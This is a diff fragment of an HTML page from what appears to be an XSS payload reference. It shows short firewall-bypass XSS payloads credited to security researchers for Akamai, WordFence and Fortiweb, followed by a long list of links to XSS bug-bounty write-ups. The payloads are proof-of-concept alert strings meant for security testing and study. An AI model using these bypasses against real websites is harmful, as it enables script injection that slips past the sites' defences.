-  <a href="https://twitter.com/s0md3v/status/1056447131362324480">@s0md3v</a> - 28th October 2018
+  Akamai WAF Bypass by <a href="https://twitter.com/s0md3v/status/1056447131362324480">@s0md3v</a> - 28th October 2018
   <a class="anchor" href="#akamai-waf-bypass-by-s0md3vhttpstwittercoms0md3vstatus1056447131362324480---28th-october-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">dETAILS</span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">0aopen</span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">0aonToGgle</span><span style="color:#960050;background-color:#1e0010">%</span><span style="color:#a6e22e">0a</span><span style="color:#f92672">=</span><span style="color:#e6db74">%0aa=prompt,a()</span> <span style="color:#a6e22e">x</span>&gt;
 </span></span></code></pre></div><h3 id="wordfence-waf-bypass-by-brutelogichttpstwittercombrutelogic---12th-september-2018">
-  WordFence WAF Bypass by 
-  <a href="https://twitter.com/brutelogic">@brutelogic</a> - 12th September 2018
+  WordFence WAF Bypass by <a href="https://twitter.com/brutelogic">@brutelogic</a> - 12th September 2018
   <a class="anchor" href="#wordfence-waf-bypass-by-brutelogichttpstwittercombrutelogic---12th-september-2018">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#a6e22e">javas</span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">99</span>;<span style="color:#a6e22e">ript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&gt;</span>
 </span></span></code></pre></div><h3 id="fortiweb-waf-bypass-by-rezadutyhttpstwittercomrezaduty---9th-july-2019">
-  Fortiweb WAF Bypass by 
-  <a href="https://twitter.com/rezaduty">@rezaduty</a> - 9th July 2019
+  Fortiweb WAF Bypass by <a href="https://twitter.com/rezaduty">@rezaduty</a> - 9th July 2019
   <a class="anchor" href="#fortiweb-waf-bypass-by-rezadutyhttpstwittercomrezaduty---9th-july-2019">#</a>
 </h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">\u003e\u003c\u0068\u0031</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;1&#39;</span>)<span style="color:#a6e22e">\u003e</span>
@@ -2557,139 +2490,73 @@ BOM character allows you to override charset of the page</p>
   <a class="anchor" href="#references">#</a>
 </h2>
 <ul>
-<li>
-  <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing-an-Ultimate-XSS-Polyglot</a></li>
+<li><a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing-an-Ultimate-XSS-Polyglot</a></li>
 <li>tbm</li>
-<li>
-  <a href="http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html">(Relative Path Overwrite) RPO XSS - Infinite Security</a></li>
-<li>
-  <a href="http://www.thespanner.co.uk/2014/03/21/rpo/">RPO TheSpanner</a></li>
-<li>
-  <a href="http://blog.innerht.ml/rpo-gadgets/">RPO Gadget - innerthmtl</a></li>
-<li>
-  <a href="http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite">Relative Path Overwrite - Detectify</a></li>
-<li>
-  <a href="http://d3adend.org/xss/ghettoBypass">XSS ghettoBypass - d3adend</a></li>
-<li>
-  <a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html">XSS without HTML: Client-Side Template Injection with AngularJS</a></li>
-<li>
-  <a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html">XSSING WEB PART - 2 - Rakesh Mane</a></li>
-<li>
-  <a href="https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5">Making an XSS triggered by CSP bypass on Twitter. @tbmnull</a></li>
-<li>
-  <a href="https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309">Ways to alert(document.domain) - @tomnomnom</a></li>
-<li>
-  <a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf">D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs</a></li>
-<li>
-  <a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">Sleeping stored Google XSS Awakens a $5000 Bounty</a> by Patrik Fehrenbach</li>
-<li>
-  <a href="http://blog.innerht.ml/rpo-gadgets/">RPO that lead to information leakage in Google</a> by filedescriptor</li>
-<li>
-  <a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/">God-like XSS, Log-in, Log-out, Log-in</a> in Uber by Jack Whitton</li>
-<li>
-  <a href="http://www.breaksec.com/?p=6129">Three Stored XSS in Facebook</a> by Nirgoldshlager</li>
-<li>
-  <a href="https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify">Using a Braun Shaver to Bypass XSS Audit and WAF</a> by Frans Rosen</li>
-<li>
-  <a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/">An XSS on Facebook via PNGs &amp; Wonky Content Types</a> by Jack Whitton</li>
-<li>
-  <a href="https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/">Stored XSS in *.ebay.com</a> by Jack Whitton</li>
-<li>
-  <a href="https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss">Complicated, Best Report of Google XSS</a> by Ramzes</li>
-<li>
-  <a href="https://hackerone.com/reports/150179">Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com</a> by secgeek</li>
-<li>
-  <a href="http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html">Command Injection in Google Console</a> by Venkat S</li>
-<li>
-  <a href="http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html">Facebook&rsquo;s Moves - OAuth XSS</a> by PAULOS YIBELO</li>
-<li>
-  <a href="http://hmgmakarovich.blogspot.hk/2015/11/stored-xss-in-google-docs-bug-bounty.html">Stored XSS in Google Docs (Bug Bounty)</a> by Harry M Gertos</li>
-<li>
-  <a href="https://hackerone.com/reports/152067">Stored XSS on developer.uber.com via admin account compromise in Uber</a> by James Kettle (albinowax)</li>
-<li>
-  <a href="https://klikki.fi/adv/yahoo.html">Yahoo Mail stored XSS</a> by Klikki Oy</li>
-<li>
-  <a href="http://mksben.l0.cm/2016/07/xxn-caret.html">Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)</a> by Masato Kinugawa</li>
-<li>
-  <a href="https://labs.detectify.com/2015/06/06/google-xss-turkey/">Youtube XSS</a> by fransrosen</li>
-<li>
-  <a href="https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter">Best Google XSS again</a> - by Krzysztof Kotowicz</li>
-<li>
-  <a href="https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/">IE &amp; Edge URL parsing Problem</a> - by detectify</li>
-<li>
-  <a href="http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html">Google XSS subdomain Clickjacking</a></li>
-<li>
-  <a href="http://blog.wesecureapp.com/xss-by-tossing-cookies/">Microsoft XSS and Twitter XSS</a></li>
-<li>
-  <a href="http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/">Google Japan Book XSS</a></li>
-<li>
-  <a href="https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/">Flash XSS mega nz</a> - by frans</li>
-<li>
-  <a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/">Flash XSS in multiple libraries</a> - by Olivier Beg</li>
-<li>
-  <a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">xss in google IE, Host Header Reflection</a></li>
-<li>
-  <a href="http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf">Years ago Google xss</a></li>
-<li>
-  <a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">xss in google by IE weird behavior</a></li>
-<li>
-  <a href="https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/">xss in Yahoo Fantasy Sport</a></li>
-<li>
-  <a href="https://klikki.fi/adv/yahoo2.html">xss in Yahoo Mail Again, worth $10000</a> by Klikki Oy</li>
-<li>
-  <a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">Sleeping XSS in Google</a> by securityguard</li>
-<li>
-  <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">Decoding a .htpasswd to earn a payload of money</a> by securityguard</li>
-<li>
-  <a href="http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form">Google Account Takeover</a></li>
-<li>
-  <a href="http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/">AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2</a> by geekboy</li>
-<li>
-  <a href="https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html">Uber Self XSS to Global XSS</a></li>
-<li>
-  <a href="https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g">How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)</a> by Marin MoulinierFollow</li>
-<li>
-  <a href="https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/">Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities</a> by Brett</li>
-<li>
-  <a href="http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html">XSSI, Client Side Brute Force</a></li>
-<li>
-  <a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/">postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson</a></li>
-<li>
-  <a href="https://hackerone.com/reports/231053">postMessage XSS Bypass</a></li>
-<li>
-  <a href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/">XSS in Uber via Cookie</a> by zhchbin</li>
-<li>
-  <a href="https://hackerone.com/reports/207042">Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP</a> by frans</li>
-<li>
-  <a href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">XSS due to improper regex in third party js Uber 7k XSS</a></li>
-<li>
-  <a href="https://hackerone.com/reports/262230">XSS in TinyMCE 2.4.0</a> by Jelmer de Hen</li>
-<li>
-  <a href="https://hackerone.com/reports/150179">Pass uncoded URL in IE11 to cause XSS</a></li>
-<li>
-  <a href="http://blog.blackfan.ru/2017/09/devtwittercom-xss.html">Twitter XSS by stopping redirection and javascript scheme</a> by Sergey Bobrov</li>
-<li>
-  <a href="http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html">Auth DOM Uber XSS</a></li>
-<li>
-  <a href="https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/">Managed Apps and Music: two Google reflected XSSes</a></li>
-<li>
-  <a href="https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/">App Maker and Colaboratory: two Google stored XSSes</a></li>
-<li>
-  <a href="https://www.youtube.com/watch?v=d9UEVv3cJ0Q&amp;feature=youtu.be">XSS in www.yahoo.com</a></li>
-<li>
-  <a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html">Stored XSS, and SSRF in Google using the Dataset Publishing Language</a></li>
-<li>
-  <a href="https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd">Stored XSS on Snapchat</a></li>
-<li>
-  <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS cheat sheet - PortSwigger</a></li>
-<li>
-  <a href="https://cure53.de/fp170.pdf">mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang</a></li>
-<li>
-  <a href="https://twitter.com/PortSwiggerRes/status/1257962800418349056">Self Closing Script</a></li>
-<li>
-  <a href="https://hackerone.com/reports/639684">Bypass &lt; with ＜</a></li>
-<li>
-  <a href="https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code">Bypassing Signature-Based XSS Filters: Modifying Script Code</a></li>
+<li><a href="http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html">(Relative Path Overwrite) RPO XSS - Infinite Security</a></li>
+<li><a href="http://www.thespanner.co.uk/2014/03/21/rpo/">RPO TheSpanner</a></li>
+<li><a href="http://blog.innerht.ml/rpo-gadgets/">RPO Gadget - innerthmtl</a></li>
+<li><a href="http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite">Relative Path Overwrite - Detectify</a></li>
+<li><a href="http://d3adend.org/xss/ghettoBypass">XSS ghettoBypass - d3adend</a></li>
+<li><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html">XSS without HTML: Client-Side Template Injection with AngularJS</a></li>
+<li><a href="http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html">XSSING WEB PART - 2 - Rakesh Mane</a></li>
+<li><a href="https://medium.com/@tbmnull/making-an-xss-triggered-by-csp-bypass-on-twitter-561f107be3e5">Making an XSS triggered by CSP bypass on Twitter. @tbmnull</a></li>
+<li><a href="https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309">Ways to alert(document.domain) - @tomnomnom</a></li>
+<li><a href="https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf">D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs</a></li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">Sleeping stored Google XSS Awakens a $5000 Bounty</a> by Patrik Fehrenbach</li>
+<li><a href="http://blog.innerht.ml/rpo-gadgets/">RPO that lead to information leakage in Google</a> by filedescriptor</li>
+<li><a href="https://whitton.io/articles/uber-turning-self-xss-into-good-xss/">God-like XSS, Log-in, Log-out, Log-in</a> in Uber by Jack Whitton</li>
+<li><a href="http://www.breaksec.com/?p=6129">Three Stored XSS in Facebook</a> by Nirgoldshlager</li>
+<li><a href="https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify">Using a Braun Shaver to Bypass XSS Audit and WAF</a> by Frans Rosen</li>
+<li><a href="https://whitton.io/articles/xss-on-facebook-via-png-content-types/">An XSS on Facebook via PNGs &amp; Wonky Content Types</a> by Jack Whitton</li>
+<li><a href="https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/">Stored XSS in *.ebay.com</a> by Jack Whitton</li>
+<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss">Complicated, Best Report of Google XSS</a> by Ramzes</li>
+<li><a href="https://hackerone.com/reports/150179">Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com</a> by secgeek</li>
+<li><a href="http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html">Command Injection in Google Console</a> by Venkat S</li>
+<li><a href="http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html">Facebook&rsquo;s Moves - OAuth XSS</a> by PAULOS YIBELO</li>
+<li><a href="http://hmgmakarovich.blogspot.hk/2015/11/stored-xss-in-google-docs-bug-bounty.html">Stored XSS in Google Docs (Bug Bounty)</a> by Harry M Gertos</li>
+<li><a href="https://hackerone.com/reports/152067">Stored XSS on developer.uber.com via admin account compromise in Uber</a> by James Kettle (albinowax)</li>
+<li><a href="https://klikki.fi/adv/yahoo.html">Yahoo Mail stored XSS</a> by Klikki Oy</li>
+<li><a href="http://mksben.l0.cm/2016/07/xxn-caret.html">Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)</a> by Masato Kinugawa</li>
+<li><a href="https://labs.detectify.com/2015/06/06/google-xss-turkey/">Youtube XSS</a> by fransrosen</li>
+<li><a href="https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter">Best Google XSS again</a> - by Krzysztof Kotowicz</li>
+<li><a href="https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/">IE &amp; Edge URL parsing Problem</a> - by detectify</li>
+<li><a href="http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html">Google XSS subdomain Clickjacking</a></li>
+<li><a href="http://blog.wesecureapp.com/xss-by-tossing-cookies/">Microsoft XSS and Twitter XSS</a></li>
+<li><a href="http://nootropic.me/blog/en/blog/2016/09/20/%E3%82%84%E3%81%AF%E3%82%8A%E3%83%8D%E3%83%83%E3%83%88%E3%82%B5%E3%83%BC%E3%83%95%E3%82%A3%E3%83%B3%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F%E3%82%89%E3%81%9F%E3%81%BE%E3%81%9F%E3%81%BEgoogle/">Google Japan Book XSS</a></li>
+<li><a href="https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/">Flash XSS mega nz</a> - by frans</li>
+<li><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/">Flash XSS in multiple libraries</a> - by Olivier Beg</li>
+<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">xss in google IE, Host Header Reflection</a></li>
+<li><a href="http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf">Years ago Google xss</a></li>
+<li><a href="http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html">xss in google by IE weird behavior</a></li>
+<li><a href="https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/">xss in Yahoo Fantasy Sport</a></li>
+<li><a href="https://klikki.fi/adv/yahoo2.html">xss in Yahoo Mail Again, worth $10000</a> by Klikki Oy</li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/">Sleeping XSS in Google</a> by securityguard</li>
+<li><a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">Decoding a .htpasswd to earn a payload of money</a> by securityguard</li>
+<li><a href="http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form">Google Account Takeover</a></li>
+<li><a href="http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/">AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2</a> by geekboy</li>
+<li><a href="https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html">Uber Self XSS to Global XSS</a></li>
+<li><a href="https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g">How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)</a> by Marin MoulinierFollow</li>
+<li><a href="https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/">Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities</a> by Brett</li>
+<li><a href="http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html">XSSI, Client Side Brute Force</a></li>
+<li><a href="https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/">postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson</a></li>
+<li><a href="https://hackerone.com/reports/231053">postMessage XSS Bypass</a></li>
+<li><a href="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/">XSS in Uber via Cookie</a> by zhchbin</li>
+<li><a href="https://hackerone.com/reports/207042">Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP</a> by frans</li>
+<li><a href="http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/">XSS due to improper regex in third party js Uber 7k XSS</a></li>
+<li><a href="https://hackerone.com/reports/262230">XSS in TinyMCE 2.4.0</a> by Jelmer de Hen</li>
+<li><a href="https://hackerone.com/reports/150179">Pass uncoded URL in IE11 to cause XSS</a></li>
+<li><a href="http://blog.blackfan.ru/2017/09/devtwittercom-xss.html">Twitter XSS by stopping redirection and javascript scheme</a> by Sergey Bobrov</li>
+<li><a href="http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html">Auth DOM Uber XSS</a></li>
+<li><a href="https://ysx.me.uk/managed-apps-and-music-a-tale-of-two-xsses-in-google-play/">Managed Apps and Music: two Google reflected XSSes</a></li>
+<li><a href="https://ysx.me.uk/app-maker-and-colaboratory-a-stored-google-xss-double-bill/">App Maker and Colaboratory: two Google stored XSSes</a></li>
+<li><a href="https://www.youtube.com/watch?v=d9UEVv3cJ0Q&amp;feature=youtu.be">XSS in www.yahoo.com</a></li>
+<li><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html">Stored XSS, and SSRF in Google using the Dataset Publishing Language</a></li>
+<li><a href="https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd">Stored XSS on Snapchat</a></li>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS cheat sheet - PortSwigger</a></li>
+<li><a href="https://cure53.de/fp170.pdf">mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang</a></li>
+<li><a href="https://twitter.com/PortSwiggerRes/status/1257962800418349056">Self Closing Script</a></li>
+<li><a href="https://hackerone.com/reports/639684">Bypass &lt; with ＜</a></li>
+<li><a href="https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code">Bypassing Signature-Based XSS Filters: Modifying Script Code</a></li>
 </ul>
 </article>
  
